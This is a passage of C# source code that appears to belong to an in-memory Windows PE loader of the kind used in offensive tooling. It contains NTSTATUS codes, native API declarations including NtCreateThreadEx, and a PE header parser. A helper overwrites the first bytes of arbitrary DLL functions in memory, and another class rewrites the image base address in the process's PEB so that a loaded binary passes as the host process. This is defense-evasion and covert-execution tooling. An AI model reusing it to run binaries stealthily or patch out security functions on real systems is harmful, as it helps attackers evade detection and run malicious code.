        InvalidSecurityDescr = 0xc0000079,
        ProcedureNotFound = 0xc000007a,
        InvalidImageFormat = 0xc000007b,
        NoToken = 0xc000007c,
        BadInheritanceAcl = 0xc000007d,
        RangeNotLocked = 0xc000007e,
        DiskFull = 0xc000007f,
        ServerDisabled = 0xc0000080,
        ServerNotDisabled = 0xc0000081,
        TooManyGuidsRequested = 0xc0000082,
        GuidsExhausted = 0xc0000083,
        InvalidIdAuthority = 0xc0000084,
        AgentsExhausted = 0xc0000085,
        InvalidVolumeLabel = 0xc0000086,
        SectionNotExtended = 0xc0000087,
        NotMappedData = 0xc0000088,
        ResourceDataNotFound = 0xc0000089,
        ResourceTypeNotFound = 0xc000008a,
        ResourceNameNotFound = 0xc000008b,
        ArrayBoundsExceeded = 0xc000008c,
        FloatDenormalOperand = 0xc000008d,
        FloatDivideByZero = 0xc000008e,
        FloatInexactResult = 0xc000008f,
        FloatInvalidOperation = 0xc0000090,
        FloatOverflow = 0xc0000091,
        FloatStackCheck = 0xc0000092,
        FloatUnderflow = 0xc0000093,
        IntegerDivideByZero = 0xc0000094,
        IntegerOverflow = 0xc0000095,
        PrivilegedInstruction = 0xc0000096,
        TooManyPagingFiles = 0xc0000097,
        FileInvalid = 0xc0000098,
        InsufficientResources = 0xc000009a,
        InstanceNotAvailable = 0xc00000ab,
        PipeNotAvailable = 0xc00000ac,
        InvalidPipeState = 0xc00000ad,
        PipeBusy = 0xc00000ae,
        IllegalFunction = 0xc00000af,
        PipeDisconnected = 0xc00000b0,
        PipeClosing = 0xc00000b1,
        PipeConnected = 0xc00000b2,
        PipeListening = 0xc00000b3,
        InvalidReadMode = 0xc00000b4,
        IoTimeout = 0xc00000b5,
        FileForcedClosed = 0xc00000b6,
        ProfilingNotStarted = 0xc00000b7,
        ProfilingNotStopped = 0xc00000b8,
        NotSameDevice = 0xc00000d4,
        FileRenamed = 0xc00000d5,
        CantWait = 0xc00000d8,
        PipeEmpty = 0xc00000d9,
        CantTerminateSelf = 0xc00000db,
        InternalError = 0xc00000e5,
        InvalidParameter1 = 0xc00000ef,
        InvalidParameter2 = 0xc00000f0,
        InvalidParameter3 = 0xc00000f1,
        InvalidParameter4 = 0xc00000f2,
        InvalidParameter5 = 0xc00000f3,
        InvalidParameter6 = 0xc00000f4,
        InvalidParameter7 = 0xc00000f5,
        InvalidParameter8 = 0xc00000f6,
        InvalidParameter9 = 0xc00000f7,
        InvalidParameter10 = 0xc00000f8,
        InvalidParameter11 = 0xc00000f9,
        InvalidParameter12 = 0xc00000fa,
        ProcessIsTerminating = 0xc000010a,
        MappedFileSizeZero = 0xc000011e,
        TooManyOpenedFiles = 0xc000011f,
        Cancelled = 0xc0000120,
        CannotDelete = 0xc0000121,
        InvalidComputerName = 0xc0000122,
        FileDeleted = 0xc0000123,
        SpecialAccount = 0xc0000124,
        SpecialGroup = 0xc0000125,
        SpecialUser = 0xc0000126,
        MembersPrimaryGroup = 0xc0000127,
        FileClosed = 0xc0000128,
        TooManyThreads = 0xc0000129,
        ThreadNotInProcess = 0xc000012a,
        TokenAlreadyInUse = 0xc000012b,
        PagefileQuotaExceeded = 0xc000012c,
        CommitmentLimit = 0xc000012d,
        InvalidImageLeFormat = 0xc000012e,
        InvalidImageNotMz = 0xc000012f,
        InvalidImageProtect = 0xc0000130,
        InvalidImageWin16 = 0xc0000131,
        LogonServer = 0xc0000132,
        DifferenceAtDc = 0xc0000133,
        SynchronizationRequired = 0xc0000134,
        DllNotFound = 0xc0000135,
        IoPrivilegeFailed = 0xc0000137,
        OrdinalNotFound = 0xc0000138,
        EntryPointNotFound = 0xc0000139,
        ControlCExit = 0xc000013a,
        InvalidAddress = 0xc0000141,
        PortNotSet = 0xc0000353,
        DebuggerInactive = 0xc0000354,
        CallbackBypass = 0xc0000503,
        PortClosed = 0xc0000700,
        MessageLost = 0xc0000701,
        InvalidMessage = 0xc0000702,
        RequestCanceled = 0xc0000703,
        RecursiveDispatch = 0xc0000704,
        LpcReceiveBufferExpected = 0xc0000705,
        LpcInvalidConnectionUsage = 0xc0000706,
        LpcRequestsNotAllowed = 0xc0000707,
        ResourceInUse = 0xc0000708,
        ProcessIsProtected = 0xc0000712,
        VolumeDirty = 0xc0000806,
        FileCheckedOut = 0xc0000901,
        CheckOutRequired = 0xc0000902,
        BadFileType = 0xc0000903,
        FileTooLarge = 0xc0000904,
        FormsAuthRequired = 0xc0000905,
        VirusInfected = 0xc0000906,
        VirusDeleted = 0xc0000907,
        TransactionalConflict = 0xc0190001,
        InvalidTransaction = 0xc0190002,
        TransactionNotActive = 0xc0190003,
        TmInitializationFailed = 0xc0190004,
        RmNotActive = 0xc0190005,
        RmMetadataCorrupt = 0xc0190006,
        TransactionNotJoined = 0xc0190007,
        DirectoryNotRm = 0xc0190008,
        CouldNotResizeLog = 0xc0190009,
        TransactionsUnsupportedRemote = 0xc019000a,
        LogResizeInvalidSize = 0xc019000b,
        RemoteFileVersionMismatch = 0xc019000c,
        CrmProtocolAlreadyExists = 0xc019000f,
        TransactionPropagationFailed = 0xc0190010,
        CrmProtocolNotFound = 0xc0190011,
        TransactionSuperiorExists = 0xc0190012,
        TransactionRequestNotValid = 0xc0190013,
        TransactionNotRequested = 0xc0190014,
        TransactionAlreadyAborted = 0xc0190015,
        TransactionAlreadyCommitted = 0xc0190016,
        TransactionInvalidMarshallBuffer = 0xc0190017,
        CurrentTransactionNotValid = 0xc0190018,
        LogGrowthFailed = 0xc0190019,
        ObjectNoLongerExists = 0xc0190021,
        StreamMiniversionNotFound = 0xc0190022,
        StreamMiniversionNotValid = 0xc0190023,
        MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
        CantOpenMiniversionWithModifyIntent = 0xc0190025,
        CantCreateMoreStreamMiniversions = 0xc0190026,
        HandleNoLongerValid = 0xc0190028,
        NoTxfMetadata = 0xc0190029,
        LogCorruptionDetected = 0xc0190030,
        CantRecoverWithHandleOpen = 0xc0190031,
        RmDisconnected = 0xc0190032,
        EnlistmentNotSuperior = 0xc0190033,
        RecoveryNotNeeded = 0xc0190034,
        RmAlreadyStarted = 0xc0190035,
        FileIdentityNotPersistent = 0xc0190036,
        CantBreakTransactionalDependency = 0xc0190037,
        CantCrossRmBoundary = 0xc0190038,
        TxfDirNotEmpty = 0xc0190039,
        IndoubtTransactionsExist = 0xc019003a,
        TmVolatile = 0xc019003b,
        RollbackTimerExpired = 0xc019003c,
        TxfAttributeCorrupt = 0xc019003d,
        EfsNotAllowedInTransaction = 0xc019003e,
        TransactionalOpenNotAllowed = 0xc019003f,
        TransactedMappingUnsupportedRemote = 0xc0190040,
        TxfMetadataAlreadyPresent = 0xc0190041,
        TransactionScopeCallbacksNotSet = 0xc0190042,
        TransactionRequiredPromotion = 0xc0190043,
        CannotExecuteFileInTransaction = 0xc0190044,
        TransactionsNotFrozen = 0xc0190045,

        MaximumNtStatus = 0xffffffff
    }
}
internal static unsafe class NativeDeclarations
{
    internal const uint PAGE_EXECUTE_READWRITE = 0x40;
    internal const uint PAGE_READWRITE = 0x04;
    internal const uint PAGE_EXECUTE_READ = 0x20;
    internal const uint PAGE_EXECUTE = 0x10;
    internal const uint PAGE_EXECUTE_WRITECOPY = 0x80;
    internal const uint PAGE_NOACCESS = 0x01;
    internal const uint PAGE_READONLY = 0x02;
    internal const uint PAGE_WRITECOPY = 0x08;

    internal const uint MEM_COMMIT = 0x1000;
    internal const uint MEM_RELEASE = 0x00008000;

    internal const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    internal const uint IMAGE_SCN_MEM_READ = 0x40000000;
    internal const uint IMAGE_SCN_MEM_WRITE = 0x80000000;



    [StructLayout(LayoutKind.Sequential)]
    internal struct IMAGE_BASE_RELOCATION
    {
        internal uint VirtualAdress;
        internal uint SizeOfBlock;
    }

    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    [DllImport("kernel32.dll")]
    internal static extern uint GetLastError();

    [DllImport("kernel32.dll", SetLastError = true)]
    internal static extern IntPtr GetStdHandle(int nStdHandle);

    [StructLayout(LayoutKind.Sequential)]
    internal struct SECURITY_ATTRIBUTES
    {
        internal int nLength;
        internal byte* lpSecurityDescriptor;
        internal int bInheritHandle;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    internal static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer,
        uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll")]
    internal static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
        ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("ntdll.dll", SetLastError = true)]
    internal static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass,
        IntPtr processInformation, uint processInformationLength, IntPtr returnLength);

    [DllImport("kernel32")]
    internal static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    internal static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    internal static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    internal static extern IntPtr GetCommandLine();

    [DllImport("kernel32.dll", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool CloseHandle(IntPtr hObject);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate Native.NTSTATUS NtCreateThreadEx(
out IntPtr threadHandle,
Native.ACCESS_MASK desiredAccess,
IntPtr objectAttributes,
IntPtr processHandle,
IntPtr startAddress,
IntPtr parameter,
bool createSuspended,
int stackZeroBits,
int sizeOfStack,
int maximumStackSize,
IntPtr attributeList);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate Native.NTSTATUS NtWaitForSingleObject(
IntPtr Handle,
Boolean Alertable,
UInt32 Timeout);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate Native.NTSTATUS NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        UInt32 AllocationType,
        UInt32 Protect);


    [DllImport("kernel32.dll")]
    internal static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,
        out uint lpFlOldProtect);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    internal static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    internal static extern bool VirtualFree(IntPtr pAddress, uint size, uint freeType);

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        internal uint ExitStatus;
        internal IntPtr PebAddress;
        internal UIntPtr AffinityMask;
        internal int BasePriority;
        internal UIntPtr UniqueProcessId;
        internal UIntPtr InheritedFromUniqueProcessId;
    }
}

public class PELoader
{
    public struct IMAGE_DOS_HEADER
    {
        // DOS .EXE header
        public ushort e_magic; // Magic number
        public ushort e_cblp; // Bytes on last page of file
        public ushort e_cp; // Pages in file
        public ushort e_crlc; // Relocations
        public ushort e_cparhdr; // Size of header in paragraphs
        public ushort e_minalloc; // Minimum extra paragraphs needed
        public ushort e_maxalloc; // Maximum extra paragraphs needed
        public ushort e_ss; // Initial (relative) SS value
        public ushort e_sp; // Initial SP value
        public ushort e_csum; // Checksum
        public ushort e_ip; // Initial IP value
        public ushort e_cs; // Initial (relative) CS value
        public ushort e_lfarlc; // File address of relocation table
        public ushort e_ovno; // Overlay number
        public ushort e_res_0; // Reserved words
        public ushort e_res_1; // Reserved words
        public ushort e_res_2; // Reserved words
        public ushort e_res_3; // Reserved words
        public ushort e_oemid; // OEM identifier (for e_oeminfo)
        public ushort e_oeminfo; // OEM information; e_oemid specific
        public ushort e_res2_0; // Reserved words
        public ushort e_res2_1; // Reserved words
        public ushort e_res2_2; // Reserved words
        public ushort e_res2_3; // Reserved words
        public ushort e_res2_4; // Reserved words
        public ushort e_res2_5; // Reserved words
        public ushort e_res2_6; // Reserved words
        public ushort e_res2_7; // Reserved words
        public ushort e_res2_8; // Reserved words
        public ushort e_res2_9; // Reserved words
        public uint e_lfanew; // File address of new exe header
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public uint VirtualAddress;
        public uint Size;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER32
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public uint ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public uint SizeOfStackReserve;
        public uint SizeOfStackCommit;
        public uint SizeOfHeapReserve;
        public uint SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public ulong SizeOfStackReserve;
        public ulong SizeOfStackCommit;
        public ulong SizeOfHeapReserve;
        public ulong SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;

        public IMAGE_DATA_DIRECTORY ExportTable;
        public IMAGE_DATA_DIRECTORY ImportTable;
        public IMAGE_DATA_DIRECTORY ResourceTable;
        public IMAGE_DATA_DIRECTORY ExceptionTable;
        public IMAGE_DATA_DIRECTORY CertificateTable;
        public IMAGE_DATA_DIRECTORY BaseRelocationTable;
        public IMAGE_DATA_DIRECTORY Debug;
        public IMAGE_DATA_DIRECTORY Architecture;
        public IMAGE_DATA_DIRECTORY GlobalPtr;
        public IMAGE_DATA_DIRECTORY TLSTable;
        public IMAGE_DATA_DIRECTORY LoadConfigTable;
        public IMAGE_DATA_DIRECTORY BoundImport;
        public IMAGE_DATA_DIRECTORY IAT;
        public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
        public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
        public IMAGE_DATA_DIRECTORY Reserved;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_FILE_HEADER
    {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;

        [FieldOffset(8)] public uint VirtualSize;
        [FieldOffset(12)] public uint VirtualAddress;
        [FieldOffset(16)] public uint SizeOfRawData;
        [FieldOffset(20)] public uint PointerToRawData;
        [FieldOffset(24)] public uint PointerToRelocations;
        [FieldOffset(28)] public uint PointerToLinenumbers;
        [FieldOffset(32)] public ushort NumberOfRelocations;
        [FieldOffset(34)] public ushort NumberOfLinenumbers;
        [FieldOffset(36)] public DataSectionFlags Characteristics;
    }

    [Flags]
    public enum DataSectionFlags : uint
    {
        Stub = 0x00000000,
    }


    /// The DOS header
    private IMAGE_DOS_HEADER dosHeader;

    /// The file header
    private IMAGE_FILE_HEADER fileHeader;

    /// Optional 32 bit file header 
    private IMAGE_OPTIONAL_HEADER32 optionalHeader32;

    /// Optional 64 bit file header 
    private IMAGE_OPTIONAL_HEADER64 optionalHeader64;

    /// Image Section headers. Number of sections is in the file header.
    private IMAGE_SECTION_HEADER[] imageSectionHeaders;

    private byte[] rawbytes;

    public PELoader(byte[] fileBytes)
    {
        // Read in the DLL or EXE and get the timestamp
        using (var stream = new MemoryStream(fileBytes, 0, fileBytes.Length))
        {
            var reader = new BinaryReader(stream);
            dosHeader = FromBinaryReader<PELoader.IMAGE_DOS_HEADER>(reader);

            // Add 4 bytes to the offset
            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

            var ntHeadersSignature = reader.ReadUInt32();
            fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
            if (Is32BitHeader)
            {
                optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
            }
            else
            {
                optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
            }

            imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (var headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
            {
                imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
            }

            rawbytes = fileBytes;
        }
    }

    public static T FromBinaryReader<T>(BinaryReader reader)
    {
        // Read in a byte array
        var bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

        // Pin the managed memory while, copy it out the data, then unpin it
        var handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
        var theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
        handle.Free();

        return theStructure;
    }

    public bool Is32BitHeader
    {
        get
        {
            ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
            return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
        }
    }

    public IMAGE_FILE_HEADER FileHeader
    {
        get { return fileHeader; }
    }

    /// Gets the optional header
    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
    {
        get { return optionalHeader64; }
    }

    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
    {
        get { return imageSectionHeaders; }
    }

    public byte[] RawBytes
    {
        get { return rawbytes; }
    }
}

internal static class Utils
{
    internal static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
    {

        var moduleHandle = NativeDeclarations.GetModuleHandle(dllName);
        var pFunc = NativeDeclarations.GetProcAddress(moduleHandle, funcName);

        var originalBytes = new byte[patchBytes.Length];
        Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);


        var result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length,
            NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
        if (!result)
        {
            return null;
        }
        Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);


        result = NativeDeclarations.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _);
        if (!result)
        {
        }
        return originalBytes;
    }

    internal static bool PatchAddress(IntPtr pAddress, IntPtr newValue)
    {
        var result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size,
            NativeDeclarations.PAGE_EXECUTE_READWRITE, out var oldProtect);
        if (!result)
        {
            return false;
        }

        Marshal.WriteIntPtr(pAddress, newValue);
        result = NativeDeclarations.VirtualProtect(pAddress, (UIntPtr)IntPtr.Size, oldProtect, out _);
        if (!result)
        {
            return false;
        }
        return true;
    }

    internal static bool ZeroOutMemory(IntPtr start, int length)
    {
        var result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, NativeDeclarations.PAGE_READWRITE,
            out var oldProtect);
        if (!result)
        {
        }

        var zeroes = new byte[length];
        for (var i = 0; i < zeroes.Length; i++)
        {
            zeroes[i] = 0x00;
        }

        Marshal.Copy(zeroes.ToArray(), 0, start, length);

        result = NativeDeclarations.VirtualProtect(start, (UIntPtr)length, oldProtect, out _);
        if (!result)
        {
            return false;
        }

        return true;
    }

    internal static void FreeMemory(IntPtr address)
    {
        NativeDeclarations.VirtualFree(address, 0, NativeDeclarations.MEM_RELEASE);
    }

    internal static IntPtr GetPointerToPeb()
    {
        var currentProcessHandle = NativeDeclarations.GetCurrentProcess();
        var processBasicInformation =
            Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)));
        var outSize = Marshal.AllocHGlobal(sizeof(long));
        var pPEB = IntPtr.Zero;

        var result = NativeDeclarations.NtQueryInformationProcess(currentProcessHandle, 0, processBasicInformation,
            (uint)Marshal.SizeOf(typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION)), outSize);

        NativeDeclarations.CloseHandle(currentProcessHandle);
        Marshal.FreeHGlobal(outSize);

        if (result == 0)
        {
            pPEB = ((NativeDeclarations.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processBasicInformation,
                typeof(NativeDeclarations.PROCESS_BASIC_INFORMATION))).PebAddress;
        }
        else
        {
        }

        Marshal.FreeHGlobal(processBasicInformation);

        return pPEB;
    }
}

internal class ExtraEnvironmentPatcher
{
    private const int PEB_BASE_ADDRESS_OFFSET = 0x10;

    private IntPtr _pOriginalPebBaseAddress;
    private IntPtr _pPEBBaseAddr;

    private IntPtr _newPEBaseAddress;

    public ExtraEnvironmentPatcher(IntPtr newPEBaseAddress)
    {
        _newPEBaseAddress = newPEBaseAddress;
    }

    internal bool PerformExtraEnvironmentPatches()
    {
#if DEBUG
            Console.WriteLine("\n[*] Performing extra environmental patches");
#endif
        return PatchPebBaseAddress();
    }

    private bool PatchPebBaseAddress()
    {
        _pPEBBaseAddr = (IntPtr)(Utils.GetPointerToPeb().ToInt64() + PEB_BASE_ADDRESS_OFFSET);
        _pOriginalPebBaseAddress = Marshal.ReadIntPtr(_pPEBBaseAddr);
        if (!Utils.PatchAddress(_pPEBBaseAddr, _newPEBaseAddress))
        {
            return false;
        }
        return true;
    }

    internal bool RevertExtraPatches()
    {
        if (!Utils.PatchAddress(_pPEBBaseAddr, _pOriginalPebBaseAddress))
        {
            return false;
        }
        return true;
    }
}


"""